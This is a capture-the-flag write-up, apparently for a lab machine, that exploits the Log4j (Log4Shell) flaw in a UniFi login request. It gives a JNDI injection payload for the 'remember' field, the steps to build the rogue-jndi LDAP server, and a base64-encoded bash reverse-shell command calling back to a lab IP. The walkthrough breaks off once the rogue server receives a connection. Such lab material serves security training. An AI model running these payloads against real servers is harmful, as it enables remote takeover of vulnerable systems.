Task 7

What port do we need to inspect intercepted traffic for?

389, as this is the LDAP port

Submit the flag located in the michiael user's home directory.

This article (https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) says that

The vulnerability is in the rememberme (or in some versions the username) value issued in the login request

So capture the login request using Burp Suite

{
"username":"test",
"password":"test",
"remember":"${jndi:ldap://10.10.14.238/test}",
"strict":true
}

this leads to the following response:

{"meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}

Open tcpdump and start listening, then send the request in repeater:

In order to send a payload to the system that will give RCE, the payload first needs to be built using Open-JDK and Maven

Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is

an Integrated Development Environment (IDE) that can be used to create a structured project and compile

our projects into jar files .

These applications will also help us run the rogue-jndi Java application, which starts a local LDAP server

and allows us to receive connections back from the vulnerable server and execute malicious code.

after installing maven:

git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package

This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar . Now we can

construct our payload to pass into the RogueJndi-1-1.jar Java application.

To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for

giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding

issues.

┌──(glitch㉿Kali)-[~/Downloads/rogue-jndi]
└─$ echo 'bash -c bash -i >&/dev/tcp/10.10.14.238/1234 0>&1' | base64

YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjM4LzEyMzQgMD4mMQo=

Now start the Rogue-JNDI server using the payload as a command

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjM4LzEyMzQgMD4mMQo}| {base64,-d}|{bash,-i}" --hostname "10.10.14.238"

Back to the POST request, change the payload to

"remember":"${jndi:ldap://10.10.14.238:1389/o=tomcat}",

and send it

A connection to the rogue server is received and the following message is shown:
